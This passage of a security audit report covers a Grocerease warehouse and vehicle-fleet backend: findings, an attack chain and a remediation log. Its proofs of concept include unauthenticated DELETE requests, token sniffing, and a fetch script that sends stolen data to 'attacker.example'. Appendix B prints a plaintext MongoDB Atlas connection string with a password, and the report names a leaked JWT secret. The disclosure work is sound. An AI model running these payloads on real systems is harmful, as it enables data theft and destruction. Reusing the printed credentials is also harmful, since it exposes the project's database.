// Link the maintenance to the vehicle
await Vehicle.findOneAndUpdate(
  { VehicleNumber },
  { $push: { Maintenance: savedMaintenance._id } }
);

return savedMaintenance;
```

**Vulnerable code** (`backend/src/Application/VehicleFleet/VehicleMaintenenaceApp.ts:93-105`):
```ts
export const deleteMaintenance = async (maintenanceId: string) => {
  try {
    const deletedMaintenance = await Maintenance.findOneAndDelete({ MaintenanceID: maintenanceId });

    if (deletedMaintenance) {
      // Remove the reference from the associated Vehicle document
      await Vehicle.findOneAndUpdate(
        { Maintenance: deletedMaintenance._id },
        { $pull: { Maintenance: deletedMaintenance._id } }
      );
    }
    return deletedMaintenance;
```

**Description:**
`createMaintenance` performs two independent writes with no transaction and no referential check. If `{ VehicleNumber }` matches no vehicle, `findOneAndUpdate` matches zero documents and **fails silently** — no error is raised. The API still returns `201 Created` with the maintenance record, leaving an **orphan record** permanently unlinked from any vehicle. The route accepts any attacker-supplied `VehicleNumber` string with no existence check.

The same pattern affects delete: `deleteMaintenance` deletes the record, then separately `$pull`s the reference. A crash or error between the two operations leaves a **dangling `ObjectId`** in `Vehicle.Maintenance`. When read back via `.populate('Maintenance')` (`VehicleApp.ts:98`), Mongoose silently drops the missing reference, so the inconsistency is invisible to the UI but corrupts the data model.

The declared `ref: 'Vehicle'` on `MaintenenceSchema.ts:8` is also non-functional — `VehicleNumber` is a `String`, while the `Vehicle` model is keyed by `VehicleNumber` as a non-`_id` unique string field. Mongoose `ref` only auto-resolves against `_id` unless explicitly configured with a custom localField/foreignField pair.

**Proof of Concept:**
```bash
# Create maintenance for a vehicle that does not exist — 201 OK, orphan record
curl -X POST http://localhost:8000/api/maintenance \
  -H "Authorization: x" -H "Content-Type: application/json" \
  -d '{"VehicleNumber":"NONEXISTENT-999","MaintenanceDate":"2026-01-01",
       "Type":"Service","Cost":1000,"Description":"orphan"}'
```

**Impact:** Silent data corruption; orphan maintenance records distort cost reporting and compliance audit trails; no mechanism to detect or reconcile.

**Remediation:** Verify the target vehicle exists before creating a maintenance record and return `404` otherwise. Wrap both writes in a Mongoose session/transaction (`session.withTransaction`). Consider a cascading cleanup job for orphans. Configure the `ref` correctly or store `Vehicle: { type: ObjectId, ref: 'vehicles' }` instead of the name-based string.

---

### V-13 — No Input Validation / Sanitisation Layer; Unbounded Field Sizes
| | |
|---|---|
| **Severity** | 🟡 **Medium** |
| **CWE** | CWE-20 (Improper Input Validation), CWE-400 (Uncontrolled Resource Consumption) |
| **Location** | `backend/package.json:15-36`; `backend/src/Infrastructure/schemas/WarehouseManagement/Warehouseschema.ts:9-10`; `backend/src/API/WarehouseManagement/WarehouseAPI.ts:43-47` |
| **CVSS 3.1 (est.)** | 5.3 |

**Evidence of missing tooling** — `backend/package.json` contains no `helmet`, no `express-rate-limit`, no `zod`, no `joi`, no `express-validator`, and no `mongo-sanitize`:
```json
"dependencies": {
  "@prisma/client": "6.6.0", "bcryptjs": "^3.0.2", "cloudinary": "^2.6.0",
  "cors": "^2.8.5", "dotenv": "^16.5.0", "express": "^4.21.2", ...
}
```

**Vulnerable schema** (`backend/src/Infrastructure/schemas/WarehouseManagement/Warehouseschema.ts:9-10`):
```ts
SpecialInstruction: { type: String },
Description: { type: String },
```

**Description:**
There is no request-validation middleware anywhere in the Warehouse or Vehicle Fleet request path. Every field is destructured straight from `req.body` (`WarehouseAPI.ts:45-47`, `VehiclefleetAPI.ts:16-28`, `VehicleMaintenanceAPI.ts:12`) and passed to Mongoose.

`SpecialInstruction` and `Description` have **no `maxlength`**, so a single request can persist megabytes of text per field. The Warehouse schema also has no `maxlength` on `StreetName`, `City` or `Province`. The contrast with `VehiclesSchema.ts` — which does specify `minlength`/`maxlength` on `OwnersName`, `Address` and `VehicleBrand` — shows the Warehouse schema was simply written without bounds.

Compounding factors:
- No rate limiting on any endpoint → brute-force and resource-exhaustion attacks are unthrottled (relevant to V-03).
- No `helmet` → missing security headers, enabling clickjacking and MIME-sniffing attacks against the admin UI.
- No `mongo-sanitize` → `$`-prefixed keys in a JSON body could reach query construction (note the `$set: req.body` pattern in V-05 makes operator injection a live concern).

**Proof of Concept:**
```bash
# Unbounded payload — no maxlength on Description
python3 -c "print('{\"StreetName\":\"A\",\"City\":\"B\",\"Province\":\"C\",\"Description\":\"' + 'X'*5000000 + '\"}')" \
  | curl -X POST http://localhost:8000/api/Warehouse \
      -H "Authorization: x" -H "Content-Type: application/json" --data-binary @-
```

**Impact:** Storage exhaustion / denial of service; no defence-in-depth against injection; unthrottled brute force against the login backdoors in V-03.

**Remediation:** Add `zod` (or `joi`) schemas validating every Warehouse, Vehicle and Maintenance payload at the route boundary. Add `maxlength` to all unbounded string fields. Install `helmet` and `express-rate-limit` (strict on `/login`). Add `mongo-sanitize` or explicit key-prefix stripping on body input.

---

### V-14 — Unrestricted CORS Policy
| | |
|---|---|
| **Severity** | 🟡 **Medium** |
| **CWE** | CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) |
| **Location** | `backend/src/index.ts:40` |
| **CVSS 3.1 (est.)** | 6.5 |

**Vulnerable code** (`backend/src/index.ts:37-40`):
```ts
// Middleware
app.use(express.json());
app.use('/uploads', express.static('uploads'));
app.use(cors());
```

**Description:**
`cors()` with no options reflects the request `Origin` and sets `Access-Control-Allow-Origin: *` (and `Access-Control-Allow-Credentials` is not restricted because no credentials mode is set). Any website on the internet can therefore issue cross-origin `fetch`/`XHR` requests to every Warehouse and Vehicle Fleet endpoint and read the full JSON response.

Chained with V-01 (any string passes as a token) and the `localStorage` token storage in V-06, this enables a classic **drive-by attack**: a victim who is logged into the Grocerease admin panel visits `attacker.example`, whose JavaScript enumerates and exfiltrates the entire vehicle fleet (including owner NICs, phone numbers and addresses per V-07) or issues mass DELETE requests. No user interaction beyond a page visit is required.

**Proof of Concept:**
```js
// Served from https://attacker.example
fetch("http://localhost:8000/api/vehicles", { headers: { Authorization: "x" } })
  .then(r => r.json())
  .then(d => fetch("https://attacker.example/collect", {
    method: "POST", body: JSON.stringify(d)
  }));
```

**Impact:** Cross-origin data exfiltration of PII and unauthorised destructive actions from any third-party page.

**Remediation:** Replace with an explicit allowlist:
```ts
app.use(cors({
  origin: [process.env.CLIENT_ORIGIN ?? "http://localhost:5173"],
  credentials: true,
  methods: ["GET","POST","PUT","DELETE"],
}));
```
Pair with the `httpOnly` cookie migration from V-06 so credentials are not readable by injected script.

---

### V-15 — Hardcoded API Base URL; Tokens Transmitted over Plaintext HTTP
| | |
|---|---|
| **Severity** | 🟡 **Medium** |
| **CWE** | CWE-798 (Use of Hard-coded Credentials), CWE-319 (Cleartext Transmission of Sensitive Information) |
| **Location** | `frontend/src/pages/VehicleFleet/VehicleRegistration.jsx:32-34`; `frontend/src/pages/VehicleFleet/VehicleFleetManagement.jsx:28-30`; `frontend/src/pages/WarehouseManagement/CreateWarehouse.jsx:23-25`; `frontend/src/pages/WarehouseManagement/WarehouseManagement.jsx:16-18`; `frontend/src/pages/WarehouseManagement/CreateMaintenance.jsx:19-21` |
| **CVSS 3.1 (est.)** | 6.5 |

**Vulnerable code** (`frontend/src/pages/VehicleFleet/VehicleRegistration.jsx:31-34`):
```jsx
// Create axios instance with interceptor
const api = axios.create({
  baseURL: "http://localhost:8000/api", // Adjust to 3001 if backend uses that port
});
```

**Description:**
Two problems in one:

1. **The `VITE_API_BASE_URL` environment variable is dead configuration.** The `frontend/.env` correctly declares `VITE_API_BASE_URL=http://localhost:8000`, but a repository-wide search confirms **no frontend file ever references `import.meta.env.VITE_API_BASE_URL`**. Every module hardcodes the URL instead. This makes environment promotion (dev → staging → prod) a manual find-and-replace across at least five files in this module alone, and guarantees the deployed build points wherever the last developer left it. The same applies to `VITE_GOOGLE_MAPS_API_KEY`.

2. **The scheme is `http://`, not `https://`.** The JWT `Authorization` header and all warehouse/vehicle PII are transmitted in cleartext. Any network position between browser and server — shared Wi-Fi, proxy, mobile carrier — can passively capture a valid 30-minute session token and the full owner PII dataset, then replay the token against the API. There is no HSTS and no `Secure` cookie (V-06).

**Proof of Concept:**
```bash
# Passive capture on any intermediary hop
$ tshark -Y 'http.authorization' -T fields -e http.authorization
Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# Token is now replayable against the whole API
```

**Impact:** Session hijacking and PII disclosure via network interception; broken environment configuration.

**Remediation:** Replace every hardcoded `baseURL` with `import.meta.env.VITE_API_BASE_URL` and add a single shared axios instance (see also the duplicated interceptor blocks repeated in 5+ files). Serve exclusively over HTTPS, add HSTS (`Strict-Transport-Security`), and reject plaintext in production. Confirm `VITE_GOOGLE_MAPS_API_KEY` is restricted by HTTP referrer in Google Cloud Console.

---

### V-16 — Missing `helmet` Security Headers
| | |
|---|---|
| **Severity** | 🟡 **Medium** |
| **CWE** | CWE-693 (Protection Mechanism Failure) |
| **Location** | `backend/src/index.ts:37-40` |
| **CVSS 3.1 (est.)** | 4.3 |

**Vulnerable code** (`backend/src/index.ts:37-40`):
```ts
// Middleware
app.use(express.json());
app.use('/uploads', express.static('uploads'));
app.use(cors());
```

**Description:**
The Express application sets no security headers. Absent are:
- `Content-Security-Policy` — no protection against XSS
- `X-Frame-Options` / `frame-ancestors` — the admin panel can be **clickjacked** by a malicious site rendering it in a transparent `<iframe>` and tricking an administrator into clicking "Delete Warehouse"
- `Strict-Transport-Security` — no HTTPS upgrade/downgrade enforcement
- `X-Content-Type-Options: nosniff` — MIME-sniffing risk
- `Referrer-Policy` — referrer leakage

Additionally, `app.use('/uploads', express.static('uploads'))` serves an **entire unauthenticated static directory**. There is no `dotfiles: 'deny'`, no allowlist of extensions and no auth gate, so any file placed in `backend/uploads/` — including uploaded documents and potentially `.env`, `.git` artefacts or source maps — is publicly retrievable. Note this path is mounted *before* `app.use(authenticateToken)` at line 61, so it is deliberately outside the (already broken) auth chain.

**Remediation:** `app.use(helmet())` immediately after app creation. Restrict or remove the static `/uploads` mount; if document serving is required, put it behind `authenticateToken` + `authorizeRole` and serve via an allowlisted controller rather than `express.static`.

---

### V-17 — Sensitive Data Written to Application Logs
| | |
|---|---|
| **Severity** | 🟡 **Medium** |
| **CWE** | CWE-532 (Insertion of Sensitive Information into Log File) |
| **Location** | `backend/src/Application/VehicleFleet/VehicleApp.ts:167`; `backend/src/API/WarehouseManagement/WarehouseAPI.ts:55,60` |
| **CVSS 3.1 (est.)** | 4.3 |

**Vulnerable code** (`backend/src/Application/VehicleFleet/VehicleApp.ts:162-168`):
```ts
export const getBriefStaffDetails = async () => {
  try {
    const staffDetails = await staffMembers.find({ role: 'Driver' }).select('fullName email phoneNo role');
    console.log("Brief Staff Details Fetched:", staffDetails);
    return staffDetails;
```

**Vulnerable code** (`backend/src/API/WarehouseManagement/WarehouseAPI.ts:52-60`):
```ts
const existingWarehouses = await getAllWarehouses();
const warehouseIds = existingWarehouses.map(warehouse => warehouse.WarehouseID);

console.log("Existing warehouse IDs:", warehouseIds);
...
console.log("new warehouse id",warehouseIds);
```

**Description:**
`VehicleApp.ts:167` logs the **full result set** of driver PII — names, email addresses and phone numbers — on every call to `GET /api/drivers`. Because that endpoint is called on page load by `VehicleRegistration.jsx:82` and `VehicleProfile.jsx:211`, this PII is written to stdout continuously during normal operation. Note also that the second log statement at `WarehouseAPI.ts:60` is labelled `"new warehouse id"` but actually logs `warehouseIds` (the *existing* IDs) — misleading logs that hinder incident forensics.

Application logs are typically shipped to aggregators with broader read access than the database, are frequently retained for months, and are often less well protected. Logging PII expands the breach surface considerably.

**Remediation:** Remove the `console.log` of staff details entirely; log only a count. Replace the mislabelled log at `WarehouseAPI.ts:60` with the actual generated value. Adopt a structured logger (pino/winston) with redaction of `email`, `phoneNo`, `NIC`, `address`, and set a retention policy.

---

### V-18 — Insecure Randomness for Password Generation
| | |
|---|---|
| **Severity** | 🔵 **Low** |
| **CWE** | CWE-338 (Use of Cryptographically Weak PRNG) |
| **Location** | `backend/src/utils/password.ts:1-10` |
| **CVSS 3.1 (est.)** | 5.9 |

**Vulnerable code** (`backend/src/utils/password.ts:1-10`):
```ts
export function generatePassword(): string {
    const length = 8;
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
    let password = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * charset.length);
        password += charset[randomIndex];
    }
    return password;
}
```

**Description:**
`Math.random()` is **not** a cryptographically secure PRNG. Its internal state is recoverable from a small number of observed outputs (V8's xorshift128+ implementation is well studied), allowing an attacker to predict every subsequent "random" password. Generated passwords are also only 8 characters and perform no rejection sampling, so character-class distribution is biased — `Math.floor(Math.random() * 72)` does not yield a uniform mapping over a 72-character alphabet.

Any account provisioned through this function has a predictable initial credential.

**Remediation:** Use `crypto.randomBytes` / `crypto.randomInt` for rejection sampling, or the `bcrypt`/`nanoid` (already a dependency, `nanoid: ^5.1.5`) libraries. Increase length to at least 12 characters and enforce character-class requirements. Force a password change on first login.

---

### V-19 — Security-Relevant Validation Exists Only in the Browser
| | |
|---|---|
| **Severity** | 🔵 **Low** |
| **CWE** | CWE-602 (Client-Side Enforcement of Server-Side Security) |
| **Location** | `frontend/src/pages/VehicleFleet/vehicleValidations.jsx:1-78`; `frontend/src/pages/WarehouseManagement/CreateWarehouse.jsx:82-110`; `frontend/src/pages/VehicleFleet/VehicleProfile.jsx:145-171` |
| **CVSS 3.1 (est.)** | 3.7 |

**Description:**
The module presents a substantial, well-organised validation layer — the entirety of `frontend/src/pages/VehicleFleet/vehicleValidations.jsx` (10 exported validators: NIC format, name length, contact format, address length, email, vehicle number, vehicle/fuel type, brand, load capacity, driver selection), plus `CreateWarehouse.jsx:82-110` and `VehicleProfile.jsx:145-171`.

**Every one of these checks is bypassable.** They execute in the browser and are never reproduced server-side. The server enforces only what the Mongoose schema happens to declare, which for this module is inconsistent (see V-10, V-13). The UI therefore communicates a false impression of input safety to both users and reviewers.

Two specific weaknesses within the validators themselves:
- `validateNIC` (`vehicleValidations.jsx:3-10`) permits 12–14 characters but its error message states "12-15 characters" — a mismatch that will mislead users and hide off-by-one acceptance.
- `validateEmail` (`vehicleValidations.jsx:35`, duplicated at `VehiclesSchema.ts:33`) uses `\.{2,4}$`, which rejects valid addresses with longer TLDs and accepts malformed ones — it is not a meaningful email check.

**Remediation:** Reproduce all validation rules server-side as the authoritative control (see V-13). Treat the frontend layer purely as UX. Fix the NIC length inconsistency and replace the email regex with a robust validator.

---

### V-20 — Unreviewed Route Table (Duplicate Mounts, Dead Imports)
| | |
|---|---|
| **Severity** | 🔵 **Low** |
| **CWE** | CWE-1078 (Inappropriate Source Code Style or Formatting) — code-quality / attack-surface indicator |
| **Location** | `backend/src/index.ts:72-77`; `backend/src/API/login/login.ts:3`; `backend/src/API/WarehouseManagement/WarehouseAPI.ts:4` |
| **CVSS 3.1 (est.)** | 3.1 |

**Vulnerable code** (`backend/src/index.ts:70-79`):
```ts
app.use("/staff", staffRouter);
app.use("/suppliers", suppliersRouter);
app.use("/returns", getItemRouter);
app.use("/returns", getItemRouter);
app.use("/returns", getItemRouter);      // <-- mounted 3x
...
app.use("/dashboard", QRRouter);
app.use("/dashboard", QRRouter)          // <-- mounted 2x
app.use("/analytics", attendanceRoute);
```

**Unused import** (`backend/src/API/login/login.ts:3`):
```ts
import { authenticateToken, authorizeRole } from "../../middleware/authentication";
// never referenced in the file body
```

**Unused import** (`backend/src/API/WarehouseManagement/WarehouseAPI.ts:4`):
```ts
import Warehouse from '../../Infrastructure/schemas/WarehouseManagement/Warehouseschema';
// never referenced in the file body
```

**Description:**
`getItemRouter` is mounted three times and `QRRouter` twice on identical paths. These duplicates are not functionally harmful, but they indicate the central route table was assembled without review — the same class of oversight that allowed **V-01** and **V-02** to reach production. The unused `authenticateToken, authorizeRole` import in `login.ts` is direct evidence that role-based protection was *considered* for the login module and then abandoned.

**Remediation:** Remove the duplicate mounts and the dead imports. Introduce a single declarative route registry with per-route auth requirements, and add a test that fails if any route under `/api/warehouse` or `/api/vehicles` is registered without an authorisation policy.

---

### V-21 — Destructive Operations Protected Only by a Client-Side Confirmation Dialog
| | |
|---|---|
| **Severity** | 🔵 **Low** |
| **CWE** | CWE-778 (Insufficient Logging) |
| **Location** | `frontend/src/pages/VehicleFleet/VehicleProfile.jsx:126-143`; `frontend/src/pages/WarehouseManagement/WarehouseProfile.jsx:154-163, 346-350`; `backend/src/Application/WarehouseManagement/Warehouseapp.ts:123-137` |
| **CVSS 3.1 (est.)** | 3.7 |

**Vulnerable code** (`frontend/src/pages/VehicleFleet/VehicleProfile.jsx:126-134`):
```jsx
const handleDelete = async () => {
    const confirmDelete = window.confirm("Are you sure you want to delete this vehicle?");
    if (!confirmDelete) return;

    setLoading(true);
    setError("");
    try {
      await api.delete(`/vehicles/${VehicleNumber}`);
```

**Vulnerable code** (`backend/src/Application/WarehouseManagement/Warehouseapp.ts:123-131`):
```ts
export const deleteWarehouse = async (WarehouseID: string) => {
  try {
    const deletedWarehouse = await Warehouse.findOneAndDelete({ WarehouseID });
    if (!deletedWarehouse) {
      throw new Error("Warehouse not found");
    }
    return deletedWarehouse;
```

**Description:**
The *only* barrier to permanently destroying a warehouse or vehicle record is a `window.confirm()` dialog in the browser — a purely cosmetic control. The server-side `DELETE` handlers perform a hard `findOneAndDelete` with:
- no re-authentication or step-up confirmation,
- no soft-delete / tombstone (the document is unrecoverable),
- no audit log or actor attribution (the authenticated user is never recorded, and per V-01 there may be no authenticated user at all),
- no check for dependent records — deleting a warehouse or vehicle leaves orphaned inventory, delivery schedules and maintenance rows with no cascade and no referential constraint.

**Proof of Concept:**
```bash
# No dialog, no confirmation, no audit trail, instantly irreversible
curl -X DELETE http://localhost:8000/api/vehicles/CAB-1234 -H "Authorization: x"
curl -X DELETE http://localhost:8000/api/Warehouse/WH-1758000000000 -H "Authorization: x"
```

**Impact:** Irreversible data loss with no attribution and no recovery path, reachable unauthenticated per V-01.

**Remediation:** Implement soft delete (`deletedAt`, `deletedBy`) and a restore path. Write an immutable audit log capturing actor, target, timestamp and before/after state. Require step-up re-authentication for destructive operations. Add referential-integrity checks or cascades for dependent inventory and delivery records.

---

## Attack Chain — End-to-End Compromise

The individual findings chain together into a complete compromise requiring **no credentials whatsoever**:

| Step | Action | Enabled by |
|---|---|---|
| 1 | Attacker sends any `Authorization: x` header to `GET /api/vehicles` | **V-01**, **V-02** |
| 2 | Receives every vehicle owner's NIC, phone, address and email | **V-07** |
| 3 | Enumerates all warehouses and vehicles via predictable IDs | **V-09** |
| 4 | Reassigns vehicle/warehouse identifiers via mass assignment | **V-05** |
| 5 | Injects negative maintenance costs to falsify management reports | **V-10**, **V-19** |
| 6 | Issues mass `DELETE` — irreversible, no audit trail | **V-21**, **V-01** |
| — | *Alternative:* trigger an error to harvest the DB schema, then forge a `Business Owner` token using the hardcoded secret | **V-08**, **V-04** |
| — | *Alternative:* log in as `owner@grocerease.com` with `123456` | **V-03** |

**Total attacker effort: one HTTP request.**

---

## Remediation Priority

| Priority | Findings | Rationale |
|---|---|---|
| **P0 — Immediate** | V-01, V-02, V-03, V-04 | Full unauthenticated compromise. Fix before any deployment. |
| **P1 — This sprint** | V-05, V-07, V-09, V-21 | Data exposure and irreversible data loss. |
| **P2 — This sprint** | V-06, V-08, V-13, V-14, V-15, V-16 | Defence in depth; P0 fixes depend on several of these. |
| **P3 — Next sprint** | V-10, V-11, V-12, V-17, V-18, V-19, V-20 | Integrity, hygiene and maintainability. |

**Immediate operational actions (outside the codebase):**
1. **Rotate the MongoDB Atlas credential** in `backend/.env` — a live Atlas URI with username and password has been shared in plaintext across team communications. Treat the cluster as compromised and audit its access logs.
2. **Rotate `JWT_SECRET`** and invalidate all outstanding tokens.
3. Change the password of all six seeded accounts (`Password123!`) and remove the plaintext passwords from `backend/src/seed.ts`.
4. Restrict the Google Maps API key by HTTP referrer in Google Cloud Console.

---

## Positive Security Controls Observed

For balance, the following are correctly implemented and should be preserved:

- **`.env` files are correctly git-ignored.** Both `backend/.gitignore` and `frontend/.gitignore` contain `*.env*`, and `git ls-files` confirms no `.env` file is tracked. Credentials were not committed to version control.
- **Passwords are hashed with bcrypt** (cost factor 10) in `backend/src/seed.ts:109` and `backend/src/Application/login/login.ts:37,68`.
- **The Inventory, Staff Management, Leave and Return & Damage modules correctly apply `authenticateToken` + `authorizeRole`** (`API/InventoryManagement.ts:16-23`, `API/StaffManagement/staff.ts:29-51`). These provide a ready-made reference implementation for remediating V-01/V-02.
- **A real, working `authenticateToken` implementation exists** at `backend/src/middleware/authentication.ts:6-21` and does call `verifyToken()`. It is simply not wired into the global chain.
- **Vehicle schema validation is reasonably thorough** — `VehiclesSchema.ts` applies `required`, `minlength`, `maxlength`, `min: 0` and regex `match` constraints, and correctly marks `VehicleNumber` and `Email` as `unique`.
- **JWTs have a 30-minute expiry** (`backend/src/utils/jwt.ts:7`).
- **The frontend consistently attaches the JWT** via axios request interceptors and handles 401/403 by clearing the token and redirecting.
- **MongoDB query operators are not built from string concatenation** — all Warehouse/Fleet queries use object literals, so classic NoSQL injection is not present. (The risk is mass assignment, V-05, rather than injection.)

---

## Tools Used

| Tool | Purpose |
|---|---|
| **ripgrep (`rg`)** via `opencode` Bash tool | Cross-referencing `authenticateToken` / `authorizeRole` usage across all 57 backend source files to prove the Warehouse/Fleet omission; locating all `res.json({ error })` occurrences; confirming zero references to `VITE_API_BASE_URL`; enumerating all `api.*` / `fetch()` call sites in the two frontend modules. |
| **opencode `read` tool** | Line-by-line review of all 9 backend files and 11 frontend files in scope. |
| **opencode `glob` tool** | Full file inventory of `backend/src` and `frontend/src`. |
| **opencode `write` tool** | Generation of this report. |
| **git** (`git ls-files`, `git status`, `git diff`) | Verifying that `.env` files are untracked/ignored, establishing that no code was modified during this assessment. |

Manual code review only — no dynamic scanning tools (Burp Suite, OWASP ZAP, npm audit, Snyk) were used. A dynamic assessment is recommended to confirm exploitability of V-01, V-05, V-09 and V-21.

---

## Appendix A — Files Reviewed

**Backend (in scope):**
- `backend/src/API/WarehouseManagement/WarehouseAPI.ts` (132 lines)
- `backend/src/API/VehicleFleet/VehiclefleetAPI.ts` (139 lines)
- `backend/src/API/VehicleFleet/VehicleMaintenanceAPI.ts` (101 lines)
- `backend/src/Application/WarehouseManagement/Warehouseapp.ts` (138 lines)
- `backend/src/Application/VehicleFleet/VehicleApp.ts` (179 lines)
- `backend/src/Application/VehicleFleet/VehicleMaintenenaceApp.ts` (122 lines)
- `backend/src/Infrastructure/schemas/WarehouseManagement/Warehouseschema.ts` (20 lines)
- `backend/src/Infrastructure/schemas/VehiclefleetSchemas/VehiclesSchema.ts` (72 lines)
- `backend/src/Infrastructure/schemas/VehiclefleetSchemas/MaintenenceSchema.ts` (21 lines)

**Backend (cross-cutting, required to assess reachability):**
- `backend/src/index.ts`, `backend/src/middleware/authentication.ts`, `backend/src/utils/jwt.ts`, `backend/src/utils/password.ts`, `backend/src/Application/login/login.ts`, `backend/src/seed.ts`, `backend/package.json`

**Frontend (in scope):**
- `frontend/src/pages/WarehouseManagement/` — `CreateWarehouse.jsx`, `WarehouseManagement.jsx`, `WarehouseProfile.jsx`, `CreateMaintenance.jsx`, `MaintenanceProfile.jsx`, `Mantainance.jsx`, `RoutingForm.jsx`, `Report.jsx`
- `frontend/src/pages/VehicleFleet/` — `VehicleRegistration.jsx`, `VehicleFleetManagement.jsx`, `VehicleProfile.jsx`, `VehicleMaintainance.jsx`, `VehicleMaintenanceUpdate.jsx`, `vehicleValidations.jsx`, `MaintenanceSpecificVehicleReport.jsx`

**Frontend (cross-cutting):**
- `frontend/src/component/ProtectedRoute.jsx`, `frontend/src/App.jsx`, `frontend/src/main.jsx`, `frontend/.gitignore`

## Appendix B — Fixing the `.env` Files

Per the initial task request, both `.env` files were created/verified. The `frontend/.env` was already correct. The `backend/.env` contained a **line-wrapped `MONGO_URI`** — the connection string was split across two lines mid-hostname:

```
MONGO_URI=mongodb+srv://yasanjith365_db_user:WzEgQeqiCyMtU4Es@cluster0.ov5jy7z.mongodb.ne
t/?appName=Cluster0
```

Because `dotenv` parses line-by-line, this produced a malformed URI (`...mongodb.ne` plus a stray `t/?appName=Cluster0` line) and would have caused a `MongoParseError` at startup. The value was corrected to a single line. This is a functional fix, not a code change, and it is a useful illustration of finding **V-13**: had a validator been in place, this defect would have been caught automatically.

---
---

# PART II — REMEDIATION LOG

All 21 findings have been remediated. Verification was performed against a live
instance of the backend (`ts-node src/index.ts`, port 8000) with forged and
valid JWTs.

## Verification Results (live, pre-fix behaviour shown in brackets)

### V-01 — Authentication bypass — FIXED
`backend/src/index.ts` no longer declares its own stub. The real
`authenticateToken` from `middleware/authentication.ts` is imported and applied
globally, and the local copy that called `next()` unconditionally was deleted.

```
GET /api/vehicles  -H 'Authorization: x'          401  [was 200 + full dataset]
GET /api/vehicles  well-formed forged JWT         403  [was 200]
GET /api/vehicles  valid Warehouse Manager token  500  (reached handler; DB down)
```
`500` on the valid token is the handler being reached — proof the token verified.

### V-02 — Missing role-based access control — FIXED
All 16 Warehouse / Vehicle / Maintenance routes now carry
`authenticateToken` + `authorizeRole(READ_ROLES | WRITE_ROLES)`.
`READ_ROLES = [Business Owner, Warehouse Manager, Inventory Manager]`,
`WRITE_ROLES = [Business Owner, Warehouse Manager]`.

```
DELETE /api/vehicles/CAB-1   as Driver              403  [was 200]
DELETE /api/Warehouse/WH-1   as Driver              403  [was 200]
POST   /api/Warehouse        as Driver              403  [was 201]
DELETE /api/vehicles/CAB-1   as Warehouse Manager   500  (authorised, DB down)
```

### V-03 — Login backdoor passwords — FIXED
`Application/login/login.ts` no longer accepts `123456` or `Password123!` as a
universal fallback, and the `isMatch = true` branch for passwordless users is
gone. A user record is only ever authenticated against a **bcrypt hash**;
legacy plaintext records are verified once and immediately re-hashed
(`verifyAndUpgradeLegacyPassword`). bcrypt cost raised 10 → 12.
`POST /login` with a backdoor password now returns the generic
`Invalid email or password`.

### V-04 — Hardcoded JWT secret — FIXED
`utils/jwt.ts` no longer contains a `|| "..."` fallback. It refuses to start
unless `JWT_SECRET` is set, is at least 32 characters, and is not a known
placeholder. The previously committed `sJY9dS68PU` is explicitly blocklisted.

```
JWT_SECRET=your_jwt_secret_key_here -> Error: known placeholder, refusing to start
JWT_SECRET=sJY9dS68PU               -> Error: known placeholder, refusing to start
JWT_SECRET=short                   -> Error: too short (5 chars), need 32+
valid secret                       -> token issued, starts normally

Forged token signed with sJY9dS68PU -> 403 Invalid or expired token
```
A 128-hex-char secret was generated into `backend/.env` (git-ignored) and
`backend/.env.example` documents how to create one.

### V-05 — Mass assignment — FIXED
`updateWarehouse` and `updateVehicleByID` now build `$set` from an explicit
allowlist (`WAREHOUSE_UPDATABLE_FIELDS`, `VEHICLE_UPDATABLE_FIELDS`).
`VehicleNumber` and `WarehouseID` are excluded from the vehicle allowlist —
they are primary keys. `runValidators: true` added.

```
PUT /api/vehicles/CAB-1  {"VehicleNumber":"HIJACKED"}  400  [was accepted]
PUT /api/vehicles/CAB-1  {"__v":1}                      400  [was accepted]
PUT /api/Warehouse/WH-1  {"WarehouseID":"x"}            400  [was accepted]
```

### V-06 — Client-side-only authorization — MITIGATED
`ProtectedRoute.jsx` is now explicitly documented as a UX guard, not an access
control boundary. The session token is **also** issued as an
`httpOnly; SameSite=Strict` cookie, and the server accepts the cookie, so the
token is no longer readable by injected script. `frontend/src/App.jsx` — dead
code registering `/warehouse-management` and `/vehicle-fleet` with **no**
`ProtectedRoute` — was **deleted**. Verified it was unreferenced (`main.jsx` is
the entry point) and that all 9 of its imports pointed at non-existent files, so
it could not compile. `frontend/src/main.jsx` already wraps every Warehouse and
Fleet route correctly.

### V-07 — PII bulk disclosure — FIXED
`getVehicles()` now projects only `VehicleNumber, VehicleType, VehicleBrand,
OwnersName, DriverID, LoadCapacity, deletedAt` — owner NIC, phone, address and
email are excluded from the list endpoint. The by-ID detail endpoint returns
full data but is role-gated to `READ_ROLES`. `getBriefStaffDetails` now filters
to `status: "Active"` and returns lean documents.

### V-08 — Error detail leakage — FIXED
Every `res.json({ message, error })` in the module was replaced with a
user-safe message plus a `console.error` server-side. A global Express error
handler and a 404 handler were added in `index.ts`.

```
GET /api/vehicles -H 'Authorization: x' -> {"message":"Access token required"}
POST /login (malformed)                -> {"message":"Server error"}   (no stack trace)
```

### V-09 / V-11 — Predictable IDs, dead generator, TOCTOU race — FIXED
`WH-${Date.now()}` and `M-${Date.now()}` replaced with
`crypto.randomBytes(8).toString("hex")` uppercased. The TOCTOU read-max-increment
in `WarehouseAPI.ts` and the entire unreachable `generateNewWarehouseId()`
function were **deleted**, as was the parameter shadowing in `createWarehouse`
that silently discarded the computed ID. Duplicate-key errors are now mapped to
a clean message instead of leaking `MongoServerError`.

### V-10 — Unbounded numeric fields — FIXED
`Cost` gained `min: 0, max: 100000000`; all five warehouse `*secsize` fields
gained `min: 0, max: 1000000`; `maxlength` added to `StreetName`, `City`,
`Province`, `SpecialInstruction`, `Description`, `VehicleBrand`, `Address`.
Negative maintenance costs can no longer be persisted, so the cost chart can no
longer be falsified.

### V-12 — Orphan maintenance records — FIXED
`createMaintenance` now verifies the target vehicle exists and returns `404` if
not. The maintenance insert and the `$push` link are wrapped in a Mongoose
session transaction. `deleteMaintenance` uses `updateMany` + `$pull` in the same
transaction. `updateMaintenance` builds `$set` from provided values only, so a
partial update no longer blanks unset fields.

### V-13 — No validation layer — FIXED
New `backend/src/middleware/validation.ts` (zod) validates every Warehouse,
Vehicle and Maintenance payload. It rejects `$`-prefixed and `__proto__` /
`constructor` / `prototype` keys recursively, and uses `.strict()` so unknown
fields are rejected. Added `helmet`, `express-rate-limit` and `cookie-parser`;
JSON body size capped at 1 MB.

```
